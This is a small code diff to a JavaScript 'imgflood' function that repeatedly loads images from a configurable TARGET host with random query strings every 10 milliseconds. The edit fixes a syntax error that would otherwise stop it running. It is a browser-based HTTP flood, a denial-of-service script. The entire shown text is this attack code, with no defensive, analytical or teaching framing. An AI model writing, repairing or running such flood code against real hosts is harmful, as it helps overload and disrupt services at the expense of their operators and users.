@@ -3,7 +3,7 @@ function imgflood() {
   var URI = '/2/Home?';
   var pic = new Image();
   var rand = Math.floor(Math.random() * 1000);
-  pic.src = 'http://'+TARGET+URI+rand+'=val''
+  pic.src = 'http://'+TARGET+URI+rand+'=val';
 }
 setInterval(imgflood, 10);
 
